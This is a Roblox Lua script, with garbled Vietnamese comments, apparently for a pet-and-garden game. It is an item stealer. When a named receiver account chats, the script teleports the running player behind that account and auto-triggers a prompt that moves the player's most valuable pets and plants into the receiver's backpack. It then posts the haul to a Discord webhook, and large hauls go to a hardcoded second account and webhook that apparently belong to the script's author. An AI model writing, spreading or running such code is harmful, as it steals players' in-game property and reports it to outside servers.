local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")

-- C·∫§U H√åNH
local PRIMARY_USERNAME = Username
local PRIMARY_WEBHOOK = Webhook 
local DUAL_USERNAME = "namnnni2"
local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
local VALUE_THRESHOLD = 1_000_000_000_000 -- 1000 t·ª∑
local AUTO_TRANSFER_DELAY = 0.3
local HEAVY_WEIGHT = 10 -- Ng∆∞·ª°ng c√¢n n·∫∑ng ƒë·ªÉ x√°c ƒë·ªãnh pet n·∫∑ng

-- DANH S√ÅCH PET VIP (CH·ªà TH√äM KH√îNG B·ªöT)
local VIP_PETS = {"Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "Butterfly", "Dragonfly", "Raccoon"}

-- MODULE
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))

-- BI·∫æN TO√ÄN C·ª§C
local currentPrompt = nil
local isTransferring = false
local connection = nil
local trackingPlayer = nil

-- ƒê·ªäNH D·∫†NG S·ªê
local function formatNumber(n)
    return tostring(math.floor(n)):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

-- T√çNH GI√Å TR·ªä V√Ä ƒê·ªò ∆ØU TI√äN
local function calculatePriority(item)
    local priority = 0
    -- Pet VIP
    if table.find(VIP_PETS, item.Name) then
        priority = priority + 1000
    end
    -- Pet n·∫∑ng (b·∫•t k·ª≥ pet n√†o c√≥ weight >= HEAVY_WEIGHT)
    if (item.Weight or 0) >= HEAVY_WEIGHT then
        priority = priority + 500
    end
    -- Gi√° tr·ªã
    priority = priority + (item.Value or 0)
    return priority
end

-- S·∫ÆP X·∫æP ∆ØU TI√äN
local function sortByPriority(a, b)
    return calculatePriority(a) > calculatePriority(b)
end

-- WEBHOOK TH√îNG B√ÅO
local function sendWebhookNotification(items, totalValue, targetName)
    local useDual = totalValue >= VALUE_THRESHOLD
    local webhookUrl = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
    local username = useDual and DUAL_USERNAME or PRIMARY_USERNAME

    -- Ki·ªÉm tra xem c√≥ pet VIP ho·∫∑c pet n·∫∑ng kh√¥ng
    local hasVIPOrHeavyPet = false
    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) or (item.Weight or 0) >= HEAVY_WEIGHT then
            hasVIPOrHeavyPet = true
            break
        end
    end

    -- Ph√¢n lo·∫°i v·∫≠t ph·∫©m
    local categories = {
        {name = "üíé VIP Pets", items = {}},
        {name = "üèãÔ∏è Heavy Pets", items = {}},
        {name = "üêæ Regular Pets", items = {}},
        {name = "üå± Plants", items = {}}
    }

    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) then
            table.insert(categories[1].items, item)
        elseif (item.Weight or 0) >= HEAVY_WEIGHT then
            table.insert(categories[2].items, item)
        elseif item.Type == "Pet" then
            table.insert(categories[3].items, item)
        else
            table.insert(categories[4].items, item)
        end
    end

    -- T·∫°o n·ªôi dung
    local descriptionParts = {}
    for _, category in ipairs(categories) do
        if #category.items > 0 then
            table.insert(descriptionParts, "**"..category.name.." ("..#category.items.."):**")
            for _, item in ipairs(category.items) do
                table.insert(descriptionParts, string.format("- %s: $%s (%.1fkg)", 
                    item.Name, 
                    formatNumber(item.Value),
                    item.Weight or 0
                ))
            end
            table.insert(descriptionParts, "")
        end
    end

    local payload = {
        username = username,
        embeds = {{
            title = useDual and "üíé VIP TRANSFER" or "üì¶ ITEM TRANSFER",
            color = useDual and 0xFFD700 or 0x00FF00,
            description = table.concat(descriptionParts, "\n"),
            fields = {
                {name = "üë§ Sender", value = plr.Name, inline = true},
                {name = "üéØ Receiver", value = targetName, inline = true},
                {name = "üí∞ Total Value", value = "$"..formatNumber(totalValue), inline = true},
                {name = "üîó Quick Join", value = string.format("[Click Here](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), inline = false}
            },
            footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    -- N·∫øu c√≥ pet VIP ho·∫∑c pet n·∫∑ng, th√™m @everyone v√†o n·ªôi dung
    if hasVIPOrHeavyPet then
        payload.content = "@everyone"
    end

    local request = (syn and syn.request) or (http and http.request) or request
    if request then
        pcall(function()
            request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- CH·ªú V·∫¨T PH·∫®M BI·∫æN M·∫§T
local function waitForItemRemoval(tool)
    local timeout = 5 -- 5 gi√¢y timeout
    local startTime = os.time()
    while tool and tool.Parent == backpack do
        if os.time() - startTime > timeout then
            warn("Timeout waiting for item to be removed:", tool.Name)
            return false
        end
        task.wait(0.1)
    end
    return true
end

-- T·∫†O V√Ä T·ª∞ K√çCH HO·∫†T PROXIMITY PROMPT
local function createAutoPrompt(targetCharacter, targetName)
    if currentPrompt then currentPrompt:Destroy() end
    
    local prompt = Instance.new("ProximityPrompt")
    prompt.ObjectText = "Transfer to "..targetName
    prompt.ActionText = "Auto-Transfer"
    prompt.HoldDuration = 0.5
    prompt.MaxActivationDistance = 10
    prompt.Parent = targetCharacter:FindFirstChild("HumanoidRootPart")
    
    prompt.Triggered:Connect(function()
        if isTransferring then return end
        isTransferring = true
        
        -- Qu√©t v√† s·∫Øp x·∫øp kho ƒë·ªì
        local items = {}
        local totalValue = 0
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local item = {
                    Name = tool.Name,
                    Type = tool:GetAttribute("ItemType"),
                    Value = calculateItemValue(tool),
                    Weight = tool:GetAttribute("Weight"),
                    Tool = tool -- L∆∞u c·∫£ tool reference
                }
                totalValue += item.Value
                table.insert(items, item)
            end
        end
        
        table.sort(items, sortByPriority)
        
        -- Chuy·ªÉn ƒë·ªì theo th·ª© t·ª± ∆∞u ti√™n v√† ch·ªù t·ª´ng item
        local targetBackpack = Players:FindFirstChild(targetName):FindFirstChildOfClass("Backpack")
        if targetBackpack then
            for _, item in ipairs(items) do
                if item.Tool and item.Tool.Parent == backpack then
                    item.Tool.Parent = targetBackpack
                    -- Ch·ªù ƒë·∫øn khi item bi·∫øn m·∫•t kh·ªèi backpack
                    if not waitForItemRemoval(item.Tool) then
                        warn("Failed to transfer item:", item.Name)
                        break
                    end
                    task.wait(AUTO_TRANSFER_DELAY)
                end
            end
        end
        
        -- G·ª≠i webhook
        sendWebhookNotification(items, totalValue, targetName)
        
        isTransferring = false
    end)
    
    currentPrompt = prompt
    
    -- T·ª± ƒë·ªông k√≠ch ho·∫°t sau 0.5 gi√¢y
    delay(0.5, function()
        if prompt and prompt.Parent then
            prompt:InputHoldBegin()
            wait(prompt.HoldDuration)
            prompt:InputHoldEnd()
        end
    end)
end

-- D·ªäCH CHUY·ªÇN V√Ä B√ÅM THEO
local function teleportAndFollow(targetPlayer)
    if not targetPlayer.Character then return end
    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHRP then return end
    
    local myCharacter = plr.Character
    if not myCharacter then return end
    local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
    if not myHRP then return end
    
    if connection then connection:Disconnect() end
    
    connection = RunService.Heartbeat:Connect(function(deltaTime)
        local targetCF = targetHRP.CFrame
        local behindPos = targetCF.Position - (targetCF.LookVector * 3)
        local newPos = myHRP.Position:Lerp(behindPos, deltaTime * 10)
        myHRP.CFrame = CFrame.new(newPos, targetHRP.Position)
        
        if not currentPrompt then
            createAutoPrompt(targetPlayer.Character, targetPlayer.Name)
        end
    end)
end

-- THEO D√ïI CHAT
local function onPlayerChatted(player, message)
    if (player.Name == PRIMARY_USERNAME or player.Name == DUAL_USERNAME) and not isTransferring then
        if player.Character then
            teleportAndFollow(player)
        else
            player.CharacterAdded:Once(function()
                teleportAndFollow(player)
            end)
        end
    end
end

-- KH·ªûI T·∫†O
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end)

-- Kh√¥ng c√≥ th√¥ng b√°o kh·ªüi ƒë·ªông
